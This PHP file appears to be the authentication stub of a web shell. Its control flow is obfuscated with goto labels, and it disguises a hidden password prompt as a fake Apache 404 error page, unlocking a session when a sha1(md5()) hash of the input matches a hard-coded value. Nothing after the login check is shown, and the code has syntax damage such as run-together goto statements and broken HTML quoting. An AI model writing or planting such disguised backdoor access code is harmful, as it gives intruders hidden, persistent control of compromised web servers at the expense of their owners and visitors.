<?php
gotoOoyJL;
Ya7DB:
    function printLoginx() {
        echo "<!DOCTYPE html><html><head><meta name="robots" content"noindex . nofollow"><title></title></head><body>\xa\x9<h1>Not Found</h1> 
	    <title>404 Not Found</title>
\x9<style type="text / css">
\x9input[type=password] {
\x9    width: 250px;
\x9    height: 25px;
	    color: white;\xa\x9    background: transparent;
\x9    border: 1px solid white;
	    margin-left: 20px;\xa	    text-align: center;
	}\xa\x9</style>\xa	    <p>The requested URL was not found on this server.</p> \xa	<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p> 
	<hr> \xa\x9<address>Apache Server at " . $_SERVER["HTTP_HOST"] . " Port " . $_SERVER["SERVER_PORT"] . "</address> 
\xa	<center><form method="post"><input type="password" name="" . $_SESSION["keyxx"] . "" autocomplete="off"><br></form></center></body></html>
	   ";
        die;
    }
    gotoN1Ti3;
    N1Ti3:
        $auth_pass5 = "7e0abdb6a2af8d730a9b799e59dd4c96";
        gotoBoEoK;
        m0wU8:
            $keyxx = $_SESSION["keyxx"];
            gotoBQ00r;
            OoyJL:
                session_start();
                gotomFAKH;
                BoEoK:
                    if (empty($_SESSION["keyxx"])) {
                        $keyxxx = generateRandomString();
                        $_SESSION["keyxx"] = $keyxxx;
                    }
                    gotom0wU8;
                    mFAKH:
                        function generateRandomString($length = 10) {
                            $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                            $charactersLength = strlen($characters);
                            $randomString = '';
                            for ($i = 0;$i < $length;$i++) {
                                $randomString.= $characters[rand(0, $charactersLength - 1) ];
                            }
                            return $randomString;
                        }
                        gotoYa7DB;
                        BQ00r:
                            if (empty($_SESSION[sha1(md5($_SERVER["HTTP_HOST"])) . "x"])) {
                                if (isset($_POST[$keyxx]) and sha1(md5($_POST[$keyxx])) == $auth_pass5) {
                                    $_SESSION[sha1(md5($_SERVER["HTTP_HOST"])) . "x"] = true;
                                } else {
                                    printLoginx();
                                }
                                die;
                            }
                            gotoPIhBW;
                            PIhBW: ?>

